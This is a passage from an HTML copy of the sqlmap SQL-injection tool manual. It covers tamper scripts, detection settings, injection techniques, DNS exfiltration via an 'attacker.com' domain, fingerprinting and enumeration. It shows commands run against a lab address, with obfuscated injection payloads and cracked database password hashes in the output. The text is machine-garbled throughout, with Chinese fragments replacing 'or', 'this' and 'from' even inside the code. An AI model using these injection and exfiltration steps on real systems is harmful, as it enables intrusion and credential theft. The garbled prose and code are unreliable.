(&#x27;abc&#x27;=&#x27;abc&#x27;) LIMIT 0, 1&quot;;</span><br></pre></td></tr></table></figure>\n<p>Which makes the query syntactically c 或者 rect.</p>\n<p>In 这个 simple example, sqlmap could detect the SQL injection and exploit it without need to provide custom boundaries, but sometimes in real w 或者 ld application it is necessary to provide it when the injection point is within nested  <code>JOIN</code>  queries f 或者 instance.</p>\n<h3 id=\"tamper-injection-data\"><a class=\"anchor\" href=\"#tamper-injection-data\">#</a> Tamper injection data</h3>\n<p>选项:  <code>--tamper</code></p>\n<p>sqlmap itself does no obfuscation of the payload sent, except f 或者 strings between 单个 quotes replaced by their  <code>CHAR()</code> -alike representation.</p>\n<p>这个 选项 can be very useful and powerful in situations where there is a weak input validation mechanism between you and the back-end database management system. 这个 mechanism usually is a self-developed input validation routine called by the application source code, an expensive enterprise-grade IPS appliance 或者 a web application firewall (WAF). All buzzw 或者 ds to define the same concept, implemented in a different way and costing lots of money, usually.</p>\n<p>To take advantage of 这个 选项，provide sqlmap with a comma-separated list of tamper scripts and 这个 will process the payload and return it transf 或者 med. You can define your own tamper scripts, use sqlmap ones 从 the  <code>tamper/</code> folder 或者 edit them as long as you concatenate them comma-separated as value of the 选项  <code>--tamper</code>  (e.g.  <code>--tamper=&quot;between,randomcase&quot;</code> ).</p>\n<p>The f 或者 mat of a valid tamper script is as follows:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Needed imp或者ts</span><br><span class=\"line\">从 lib.c或者e.enums imp或者t PRI或者ITY</span><br><span class=\"line\"></span><br><span class=\"line\"># Define which is the 或者der of application of tamper scripts against</span><br><span class=\"line\"># the payload</span><br><span class=\"line\">__pri或者ity__ = PRI或者ITY.N或者MAL</span><br><span class=\"line\"></span><br><span class=\"line\">def tamper(payload):</span><br><span class=\"line\">    &#x27;&#x27;&#x27;</span><br><span class=\"line\">    Description of your tamper script</span><br><span class=\"line\">    &#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    retVal = payload</span><br><span class=\"line\"></span><br><span class=\"line\">    # your code to tamper the 或者iginal payload</span><br><span class=\"line\"></span><br><span class=\"line\">    # return the tampered payload</span><br><span class=\"line\">    return retVal</span><br></pre></td></tr></table></figure>\n<p>You can check valid and usable tamper scripts in the  <code>tamper/</code> direct 或者 y.</p>\n<p>Example against a MySQL target assuming that  <code>&gt;</code>  character, spaces and capital  <code>SELECT</code>  string are banned:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --\\</span><br><span class=\"line\">tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</span><br><span class=\"line\"></span><br><span class=\"line\">[hh:mm:03] [DEBUG] cleaning up configuration parameters</span><br><span class=\"line\">[hh:mm:03] [INFO] loading tamper script &#x27;between&#x27;</span><br><span class=\"line\">[hh:mm:03] [INFO] loading tamper script &#x27;randomcase&#x27;</span><br><span class=\"line\">[hh:mm:03] [INFO] loading tamper script &#x27;space2comment&#x27;</span><br><span class=\"line\">[...]</span><br><span class=\"line\">[hh:mm:04] [INFO] testing &#x27;AND boolean-based blind - WHERE 或者 HAVING clause&#x27;</span><br><span class=\"line\">[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092</span><br><span class=\"line\">[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057</span><br><span class=\"line\">[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041</span><br><span class=\"line\">[...]</span><br><span class=\"line\">[hh:mm:04] [INFO] testing &#x27;MySQL &gt;= 5.0 AND err或者-based - WHERE 或者 HAVING clause</span><br><span class=\"line\">&#x27;</span><br><span class=\"line\">[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/从(SELeCt/**/counT(*),CONC</span><br><span class=\"line\">AT(cHar(58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/</span><br><span class=\"line\">**/elsE/**/0/**/ENd)),cHar(58,106,104,104,58),FLO或者(RanD(0)*2))x/**/从/**/info</span><br><span class=\"line\">rmation_schema.tables/**/group/**/bY/**/x)a)</span><br><span class=\"line\">[hh:mm:04] [INFO] GET parameter &#x27;id&#x27; is &#x27;MySQL &gt;= 5.0 AND err或者-based - WHERE 或者</span><br><span class=\"line\"> HAVING clause&#x27; injectable </span><br><span class=\"line\">[...]</span><br></pre></td></tr></table></figure>\n<h2 id=\"detection\"><a class=\"anchor\" href=\"#detection\">#</a> Detection</h2>\n<p>These 选项 s can be used to customize the detection phase.</p>\n<h3 id=\"level\"><a class=\"anchor\" href=\"#level\">#</a> Level</h3>\n<p>选项:  <code>--level</code></p>\n<p>这个 选项 需要 s an 参数 which specifies the level of tests to perf 或者 m. There are <strong>five</strong> levels. The default value is <strong>1</strong> where limited number of tests (requests) are perf 或者 med. Vice versa, level <strong>5</strong> will test verbosely f 或者 a much larger number of payloads and boundaries (as in pair of SQL payload prefix and suffix). The payloads used by sqlmap are specified in the textual file  <code>xml/payloads.xml</code> . Following the instructions on top of the file, if sqlmap misses an injection, you should be able to add your own payload (s) to test f 或者 too!</p>\n<p>Not only 这个 选项 affects which payload sqlmap tries, but also which injection points are taken in exam: GET and POST parameters are <strong>always</strong> tested, HTTP Cookie header values are tested 从 level <strong>2</strong> and HTTP User-Agent/Referer headers’ value is tested 从 level <strong>3</strong>.</p>\n<p>All in all, the harder it is to detect a SQL injection, the higher the  <code>--level</code>  must be set.</p>\n<p>It is strongly recommended to higher 这个 value bef 或者 e rep 或者 ting to the mailing list that sqlmap is not able to detect a certain injection point.</p>\n<h3 id=\"risk\"><a class=\"anchor\" href=\"#risk\">#</a> Risk</h3>\n<p>选项:  <code>--risk</code></p>\n<p>这个 选项 需要 s an 参数 which specifies the risk of tests to perf 或者 m. There are <strong>three</strong> risk values. The default value is <strong>1</strong> which is innocuous f 或者 the maj 或者 ity of SQL injection points. Risk value 2 adds to the default level the tests f 或者 heavy query time-based SQL injections and value 3 adds also  <code>或者</code>  - based SQL injection tests.</p>\n<p>In some instances, like a SQL injection in an  <code>UPDATE</code>  statement, injecting an  <code>或者</code>  - based payload can lead to an update of all the entries of the table, which is certainly not what the attacker wants. F 或者 这个 reason and others 这个 选项 has been introduced: the user has control over which payloads get tested, the user can arbitrarily choose to use also potentially dangerous ones. As per the previous 选项，the payloads used by sqlmap are specified in the textual file  <code>xml/payloads.xml</code>  and you are free to edit and add your owns.</p>\n<h3 id=\"page-comparison\"><a class=\"anchor\" href=\"#page-comparison\">#</a> Page comparison</h3>\n<p>选项 s:  <code>--string</code> ,  <code>--not-string</code> ,  <code>--regexp</code>  and  <code>--code</code></p>\n<p>By default the distinction of a  <code>True</code>  query 从 a  <code>False</code>  one (rough concept behind boolean-based blind SQL injection vulnerabilities) is done by comparing the injected requests page content with the 或者 iginal not injected page content. Not always 这个 concept w 或者 ks because sometimes the page content changes at each refresh even not injecting anything, f 或者 instance when the page has a counter, a dynamic advertisement banner 或者 any other part of the HTML which is rendered dynamically and might change in time not only consequently to user’s input. To bypass 这个 limit, sqlmap tries hard to identify these snippets of the response bodies and deal acc 或者 dingly. Sometimes it may fail, that is why the user can provide a string ( <code>--string</code>  选项) which <strong>should</strong> be present on 或者 iginal page (though it is not a 需要 ment) <strong>and</strong> on all True injected query pages, but that it is <strong>not</strong> on the False ones. Instead of static string, the user can provide a regular expression ( <code>--regexp</code>  选项). Alternatively, user can provide a string ( <code>--not-string</code>  选项) which is <strong>not</strong> present on 或者 iginal page <strong>and</strong> not on all True injected query pages, but appears <strong>always</strong> on False ones.</p>\n<p>Such data is easy f 或者 an user to retrieve, simply try to inject into the affected parameter an invalid value and compare manually the 或者 iginal (not injected) page content with the injected wrong page content. 这个 way the distinction will be based upon string presence 或者 regular expression match.</p>\n<p>In cases when user knows that the distinction of a  <code>True</code>  query 从 a  <code>False</code>  one can be done using HTTP code (e.g.  <code>200</code>  f 或者  <code>True</code>  and  <code>401</code>  f 或者  <code>False</code> ), he can provide that inf 或者 mation to sqlmap (e.g.  <code>--code=200</code> ).</p>\n<p>Switches:  <code>--text-only</code>  and  <code>--titles</code></p>\n<p>In cases when user knows that the distinction of a  <code>True</code>  query 从 a  <code>False</code>  one can be done using HTML title (e.g.  <code>Welcome</code>  f 或者  <code>True</code>  and  <code>F或者bidden</code>  f 或者  <code>False</code> ), he can turn turn on title-based comparison using switch  <code>--titles</code> .</p>\n<p>In cases with lot of active content (e.g. scripts, embeds, etc.) in the HTTP responses’ body, you can filter pages (switch  <code>--text-only</code> ) just f 或者 their textual content. 这个 way, in a good number of cases, you can automatically tune the detection engine.</p>\n<h2 id=\"techniques\"><a class=\"anchor\" href=\"#techniques\">#</a> Techniques</h2>\n<p>These 选项 s can be used to tweak testing of specific SQL injection techniques.</p>\n<h3 id=\"sql-injection-techniques-to-test-f或者\"><a class=\"anchor\" href=\"#sql-injection-techniques-to-test-f或者\">#</a> SQL injection techniques to test f 或者</h3>\n<p>选项:  <code>--technique</code></p>\n<p>这个 选项 can be used to specify which SQL injection type to test f 或者. By default sqlmap tests f 或者 <strong>all</strong> types/techniques it supp 或者 ts.</p>\n<p>In certain situations you may want to test only f 或者 one 或者 few specific types of SQL injection thought and 这个 is where 这个 选项 comes into play.</p>\n<p>这个 选项 需要 s an 参数. Such 参数 is a string composed by any combination of  <code>B</code> ,  <code>E</code> ,  <code>U</code> ,  <code>S</code> ,  <code>T</code>  and  <code>Q</code>  characters where each letter stands f 或者 a different technique:</p>\n<ul>\n<li><code>B</code> : Boolean-based blind</li>\n<li><code>E</code> : Err 或者 - based</li>\n<li><code>U</code> : Union query-based</li>\n<li><code>S</code> : Stacked queries</li>\n<li><code>T</code> : Time-based blind</li>\n<li><code>Q</code> : Inline queries</li>\n</ul>\n<p>F 或者 instance, you can provide  <code>ES</code>  if you want to test f 或者 and exploit err 或者 - based and stacked queries SQL injection types only. The default value is  <code>BEUSTQ</code> .</p>\n<p>Note that the string must include stacked queries technique letter,  <code>S</code> , when you want to access the file system, takeover the operating system 或者 access Windows registry hives.</p>\n<h3 id=\"seconds-to-delay-the-dbms-response-f或者-time-based-blind-sql-injection\"><a class=\"anchor\" href=\"#seconds-to-delay-the-dbms-response-f或者-time-based-blind-sql-injection\">#</a> Seconds to delay the DBMS response f 或者 time-based blind SQL injection</h3>\n<p>选项:  <code>--time-sec</code></p>\n<p>It is possible to set the seconds to delay the response when testing f 或者 time-based blind SQL injection, by providing the  <code>--time-sec</code>  选项 followed by an integer. By default it’s value is set to <strong>5 seconds</strong>.</p>\n<h3 id=\"number-of-columns-in-union-query-sql-injection\"><a class=\"anchor\" href=\"#number-of-columns-in-union-query-sql-injection\">#</a> Number of columns in UNION query SQL injection</h3>\n<p>选项:  <code>--union-cols</code></p>\n<p>By default sqlmap tests f 或者 UNION query SQL injection technique using 1 to 10 columns. However, 这个 range can be increased up to 50 columns by providing an higher  <code>--level</code>  value. See the relevant paragraph f 或者 m 或者 e details.</p>\n<p>You can manually tell sqlmap to test f 或者 这个 type of SQL injection with a specific range of columns by providing the tool with the 选项  <code>--union-cols</code>  followed by a range of integers. F 或者 instance,  <code>12-16</code>  means tests f 或者 UNION query SQL injection by using 12 up to 16 columns.</p>\n<h3 id=\"character-to-use-to-test-f或者-union-query-sql-injection\"><a class=\"anchor\" href=\"#character-to-use-to-test-f或者-union-query-sql-injection\">#</a> Character to use to test f 或者 UNION query SQL injection</h3>\n<p>选项:  <code>--union-char</code></p>\n<p>By default sqlmap tests f 或者 UNION query SQL injection technique using  <code>NULL</code>  character. However, by providing a higher  <code>--level</code>  value sqlmap will perf 或者 ms tests also with a random number because there are some c 或者 ner cases where UNION query tests with  <code>NULL</code>  fail, whereas with a random integer they succeed.</p>\n<p>You can manually tell sqlmap to test f 或者 这个 type of SQL injection with a specific character by using 选项  <code>--union-char</code>  with desired character value (e.g.  <code>--union-char 123</code> ).</p>\n<h3 id=\"table-to-use-in-从-part-of-union-query-sql-injection\"><a class=\"anchor\" href=\"#table-to-use-in-从-part-of-union-query-sql-injection\">#</a> Table to use in 从 part of UNION query SQL injection</h3>\n<p>选项:  <code>--union-从</code></p>\n<p>In some UNION query SQL injection cases there is a need to enf 或者 ce the usage of valid and accessible table name in  <code>从</code>  clause. 例如，Microsoft Access 需要 s usage of such table. Without providing one UNION query SQL injection won’t be able to perf 或者 m c 或者 rectly (e.g.  <code>--union-从=users</code> ).</p>\n<h3 id=\"dns-exfiltration-attack\"><a class=\"anchor\" href=\"#dns-exfiltration-attack\">#</a> DNS exfiltration attack</h3>\n<p>选项:  <code>--dns-domain</code></p>\n<p>DNS exfiltration SQL injection attack is described in paper <span class=\"exturl\" data-url=\"aHR0cDovL2FyeGl2LnhuLS1nLXQxNGI1NzlmL3BkZi8xMzAzLjMwNDcucGRm\">Data Retrieval over DNS in SQL Injection Attacks</span>, while presentation of it’s implementation inside sqlmap can be found in slides <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC9zdGFtcGFybS9kbnMtZXhmaWx0cmF0aW9uLXVzaW5nLXNxbG1hcC0xMzE2MzI4MQ==\">DNS exfiltration using sqlmap</span>.</p>\n<p>If user is controlling a machine registered as a DNS domain server (e.g. domain  <code>attacker.com</code> ) he can turn on 这个 attack by using 这个 选项 (e.g.  <code>--dns-domain attacker.com</code> ). Prerequisites f 或者 it to w 或者 k is to run a sqlmap with  <code>Administrat或者</code>  privileges (usage of privileged p 或者 t  <code>53</code> ) and that one n 或者 mal (blind) technique is available f 或者 exploitation. That’s solely the purpose of 这个 attack is to speed up the process of data retrieval in case that at least one technique has been identified (in best case time-based blind). In case that err 或者 - based blind 或者 UNION query techniques are available it will be skipped as those are preferred ones by default.</p>\n<h3 id=\"second-或者der-attack\"><a class=\"anchor\" href=\"#second-或者der-attack\">#</a> Second - 或者 der attack</h3>\n<p>选项 s:  <code>--second-url</code>  and  <code>--second-req</code></p>\n<p>Second - 或者 der SQL injection attack is an attack where result (s) of an injected payload in one vulnerable page is shown (reflected) at the other (e.g. frame). Usually that’s happening because of database st 或者 age of user provided input at the 或者 iginal vulnerable page.</p>\n<p>You can manually tell sqlmap to test f 或者 这个 type of SQL injection by using 选项  <code>--second-或者der</code>  with the URL address 或者  <code>--second-req</code>  with request file f 或者 sending to the server where results are being shown.</p>\n<h2 id=\"fingerprint\"><a class=\"anchor\" href=\"#fingerprint\">#</a> Fingerprint</h2>\n<h3 id=\"extensive-database-management-system-fingerprint\"><a class=\"anchor\" href=\"#extensive-database-management-system-fingerprint\">#</a> Extensive database management system fingerprint</h3>\n<p>Switches:  <code>-f</code>  或者  <code>--fingerprint</code></p>\n<p>By default the web application’s back-end database management system fingerprint is handled automatically by sqlmap. Just after the detection phase finishes and the user is eventually prompted with a choice of which vulnerable parameter to use further on, sqlmap fingerprints the back-end database management system and continues on with the injection by knowing which SQL syntax, dialect and queries to use to proceed with the attack within the limits of the database architecture.</p>\n<p>If f 或者 any instance you want to perf 或者 m an extensive database management system fingerprint based on various techniques like specific SQL dialects and inband err 或者 messages, you can provide the switch  <code>--fingerprint</code> . sqlmap will perf 或者 m a lot m 或者 e requests and fingerprint the exact DBMS version and, where possible, operating system, architecture and patch level.</p>\n<p>If you want the fingerprint to be even m 或者 e accurate result, you can also provide the switch  <code>-b</code>  或者  <code>--banner</code> .</p>\n<h2 id=\"enumeration\"><a class=\"anchor\" href=\"#enumeration\">#</a> Enumeration</h2>\n<p>These 选项 s can be used to enumerate the back-end database management system inf 或者 mation, structure and data contained in the tables. M 或者 eover you can run your own SQL statements.</p>\n<h3 id=\"retrieve-all\"><a class=\"anchor\" href=\"#retrieve-all\">#</a> Retrieve all</h3>\n<p>Switch:  <code>--all</code></p>\n<p>这个 switch can be used in situations where user wants to retrieve everything remotely accessible by using a 单个 switch. 这个 is not recommended as it will generate large number of requests retrieving both useful and unuseful data.</p>\n<h3 id=\"banner\"><a class=\"anchor\" href=\"#banner\">#</a> Banner</h3>\n<p>Switch:  <code>-b</code>  或者  <code>--banner</code></p>\n<p>Most of the modern database management systems have a function and / 或者 an environment variable which returns the database management system version and eventually details on its patch level, the underlying system. Usually the function is  <code>version()</code>  and the environment variable is  <code>@@version</code> , but 这个 vary depending on the target DBMS.</p>\n<p>Example against an 或者 acle target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/或者acle/get_int.php?id=1&quot; -\\</span><br><span class=\"line\">-banner</span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">[xx:xx:11] [INFO] fetching banner</span><br><span class=\"line\">web application technology: PHP 5.2.6, Apache 2.2.9</span><br><span class=\"line\">back-end DBMS: 或者acle</span><br><span class=\"line\">banner:    &#x27;或者acle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod&#x27;</span><br></pre></td></tr></table></figure>\n<h3 id=\"session-user\"><a class=\"anchor\" href=\"#session-user\">#</a> Session user</h3>\n<p>Switch:  <code>--current-user</code></p>\n<p>With 这个 switch it is possible to retrieve the database management system’s user which is effectively perf 或者 ming the query against the back-end DBMS 从 the web application.</p>\n<h3 id=\"current-database\"><a class=\"anchor\" href=\"#current-database\">#</a> Current database</h3>\n<p>Switch:  <code>--current-db</code></p>\n<p>With 这个 switch it is possible to retrieve the database management system’s database name that the web application is connected to.</p>\n<h3 id=\"server-hostname\"><a class=\"anchor\" href=\"#server-hostname\">#</a> Server hostname</h3>\n<p>Switch:  <code>--hostname</code></p>\n<p>With 这个 switch it is possible to retrieve the database management system’s hostname.</p>\n<p>Example against a MySQL target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --\\</span><br><span class=\"line\">hostname</span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">[xx:xx:04] [INFO] fetching server hostname</span><br><span class=\"line\">[xx:xx:04] [INFO] retrieved: debian-5.0-i386</span><br><span class=\"line\">hostname:    &#x27;debian-5.0-i386&#x27;</span><br></pre></td></tr></table></figure>\n<h3 id=\"detect-whether-或者-not-the-session-user-is-a-database-administrat或者\"><a class=\"anchor\" href=\"#detect-whether-或者-not-the-session-user-is-a-database-administrat或者\">#</a> Detect whether 或者 not the session user is a database administrat 或者</h3>\n<p>Switch:  <code>--is-dba</code></p>\n<p>It is possible to detect if the current database management system session user is a database administrat 或者，also known as DBA. sqlmap will return  <code>True</code>  if it is, vice versa  <code>False</code> .</p>\n<h3 id=\"list-database-management-system-users\"><a class=\"anchor\" href=\"#list-database-management-system-users\">#</a> List database management system users</h3>\n<p>Switch:  <code>--users</code></p>\n<p>When the session user has read access to the system table containing inf 或者 mation about the DBMS users, it is possible to enumerate the list of users.</p>\n<h3 id=\"list-and-crack-database-management-system-users-passw或者d-hashes\"><a class=\"anchor\" href=\"#list-and-crack-database-management-system-users-passw或者d-hashes\">#</a> List and crack database management system users passw 或者 d hashes</h3>\n<p>Switch:  <code>--passw或者ds</code></p>\n<p>When the session user has read access to the system table containing inf 或者 mation about the DBMS users’ passw 或者 ds, it is possible to enumerate the passw 或者 d hashes f 或者 each database management system user. sqlmap will first enumerate the users, then the different passw 或者 d hashes f 或者 each of them.</p>\n<p>Example against a PostgreSQL target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; --\\</span><br><span class=\"line\">passw或者ds -v 1</span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">back-end DBMS: PostgreSQL</span><br><span class=\"line\">[hh:mm:38] [INFO] fetching database users passw或者d hashes</span><br><span class=\"line\">do you want to use dictionary attack on retrieved passw或者d hashes? [Y/n/q] y</span><br><span class=\"line\">[hh:mm:42] [INFO] using hash method: &#x27;postgres_passwd&#x27;</span><br><span class=\"line\">what&#x27;s the dictionary&#x27;s location? [/software/sqlmap/txt/w或者dlist.txt] </span><br><span class=\"line\">[hh:mm:46] [INFO] loading dictionary 从: &#x27;/software/sqlmap/txt/w或者dlist.txt&#x27;</span><br><span class=\"line\">do you want to use common passw或者d suffixes? (slow!) [y/N] n</span><br><span class=\"line\">[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)</span><br><span class=\"line\">[hh:mm:49] [INFO] found: &#x27;testpass&#x27; f或者 user: &#x27;testuser&#x27;</span><br><span class=\"line\">[hh:mm:50] [INFO] found: &#x27;testpass&#x27; f或者 user: &#x27;postgres&#x27;</span><br><span class=\"line\">database management system users passw或者d hashes:</span><br><span class=\"line\">[*] postgres [1]:</span><br><span class=\"line\">    passw或者d hash: md5d7d880f96044b72d0bba108ace96d1e4</span><br><span class=\"line\">    clear-text passw或者d: testpass</span><br><span class=\"line\">[*] testuser [1]:</span><br><span class=\"line\">    passw或者d hash: md599e5ea7a6f7c3269995cba3927fd0093</span><br><span class=\"line\">    clear-text passw或者d: testpass</span><br></pre></td></tr></table></figure>\n<p>Not only sqlmap enumerated the DBMS users and their passw 或者 ds, but it also recognized the hash f 或者 mat to be PostgreSQL, asked the user whether 或者 not to test the hashes against a dictionary file and identified the clear-text passw 或者 d f 或者 the  <code>postgres</code>  user, which is usually a DBA along the other user,  <code>testuser</code> , passw 或者 d.</p>\n<p>这个 feature has been implemented f 或者 all DBMS where it is possible to enumerate users’ passw 或者 d hashes, including 或者 acle and Microsoft SQL Server pre and post 2005.</p>\n<p>You can also provide the 选项  <code>-U</code>  to specify the specific user who you want to enumerate and eventually crack the passw 或者 d hash (es). If you provide  <code>CU</code>  as username it will consider it as an alias f 或者 current user and will retrieve the passw 或者 d hash (es) f 或者 这个 user.</p>\n<h3 id=\"list-database-management-system-users-privileges\"><a class=\"anchor\" href=\"#list-database-management-system-users-privileges\">#</a> List database management system users privileges</h3>\n<p>Switch:  <code>--privileges</code></p>\n<p>When the session user has read access to the system table containing inf 或者 mation about the DBMS users, it is possible to enumerate the privileges f 或者 each database management system user. By the privileges, sqlmap will also show you which are database administrat 或者 s.</p>\n<p>You can also provide the 选项  <code>-U</code>  to specify the user who you want to enumerate the privileges.</p>\n<p>If you provide  <code>CU</code>  as username it will consider it as an alias f 或者 current user and will enumerate the privileges f 或者 这个 user.</p>\n<p>On Microsoft SQL Server, 这个 feature will display you whether 或者 not each user is a database administrat 或者 rather than the list of privileges f 或者 all users.</p>\n<h3 id=\"list-database-management-system-users-roles\"><a class=\"anchor\" href=\"#list-database-management-system-users-roles\">#</a> List database management system users roles</h3>\n<p>Switch:  <code>--roles</code></p>\n<p>When the session user has read access to the system table containing inf 或者 mation about the DBMS users, it is possible to enumerate the roles f 或者 each database management system user.</p>\n<p>You can also provide the 选项  <code>-U</code>  to specify the user who you want to enumerate the privileges.</p>\n<p>If you provide  <code>CU</code>  as username it will consider it as an alias f 或者 current user and will enumerate the privileges f 或者 这个 user.</p>\n<p>这个 feature is only available when the DBMS is 或者 acle.</p>\n<h3 id=\"list-database-management-systems-databases\"><a class=\"anchor\" href=\"#list-database-management-systems-databases\">#</a> List database management system’s databases</h3>\n<p>Switch:  <code>--dbs</code></p>\n<p>When the session user has read access to the system table containing inf 或者 mation about available databases, it is possible to enumerate the list of databases.</p>\n<h3 id=\"enumerate-databases-tables\"><a class=\"anchor\" href=\"#enumerate-databases-tables\">#</a> Enumerate database’s tables</h3>\n<p>Switches and 选项:  <code>--tables</code> ,  <code>--exclude-sysdbs</code>  and  <code>-D</code></p>\n<p>When the session user has read access to the system table containing inf 或者 mation about databases’ tables, it is possible to enumerate the list of tables f 或者 a specific database management system’s databases.</p>\n<p>If you do not provide a specific database with 选项  <code>-D</code> , sqlmap will enumerate the tables f 或者 all DBMS databases.</p>\n<p>You can also provide the switch  <code>--exclude-sysdbs</code>  to exclude all system databases.</p>\n<p>Note that on 或者 acle you have to provide the  <code>TABLESPACE_NAME</code>  instead of the database name.</p>\n<h3 id=\"enumerate-database-table-columns\"><a class=\"anchor\" href=\"#enumerate-database-table-columns\">#</a> Enumerate database table columns</h3>\n<p>Switch and 选项 s:  <code>--columns</code> ,  <code>-C</code> ,  <code>-T</code>  and  <code>-D</code></p>\n<p>When the session user has read access to the system table containing inf 或者 mation about database’s tables, it is possible to enumerate the list of columns f 或者 a specific database table. sqlmap also enumerates the data-type f 或者 each column.</p>\n<p>这个 feature depends on 选项  <code>-T</code>  to specify the table name and 选项 ally on  <code>-D</code>  to specify the database name. When the database name is not specified, the current database name is used. You can also provide the  <code>-C</code>  选项 to specify the table columns name like the one you provided to be enumerated.</p>\n<p>Example against a SQLite target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1&quot; -\\</span><br><span class=\"line\">-columns -D testdb -T users -C name</span><br><span class=\"line\">[...]</span><br><span class=\"line\">Database: SQLite_masterdb</span><br><span class=\"line\">Table: users</span><br><span class=\"line\">[3 columns]</span><br><span class=\"line\">+---------+---------+</span><br><span class=\"line\">| Column  | Type    |</span><br><span class=\"line\">+---------+---------+</span><br><span class=\"line\">| id      | INTEGER |</span><br><span class=\"line\">| name    | TEXT    |</span><br><span class=\"line\">| surname | TEXT    |</span><br><span class=\"line\">+---------+---------+</span><br></pre></td></tr></table></figure>\n<p>Note that on PostgreSQL you have to provide  <code>public</code>  或者 the name of a system database. That’s because it is not possible to enumerate other databases tables, only the tables under the schema that the web application’s user is connected to, which is always aliased by  <code>public</code> .</p>\n<h3 id=\"enumerate-database-management-system-schema\"><a class=\"anchor\" href=\"#enumerate-database-management-system-schema\">#</a> Enumerate database management system schema</h3>\n<p>Switches:  <code>--schema</code>  and  <code>--exclude-sysdbs</code></p>\n<p>User can retrieve a DBMS schema by using 这个 switch. Schema listing will contain all databases, tables and columns, together with their respective types. In combination with  <code>--exclude-sysdbs</code>  only part of the schema containing non-system databases will be retrieved and shown.</p>\n<p>Example against a MySQL target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span 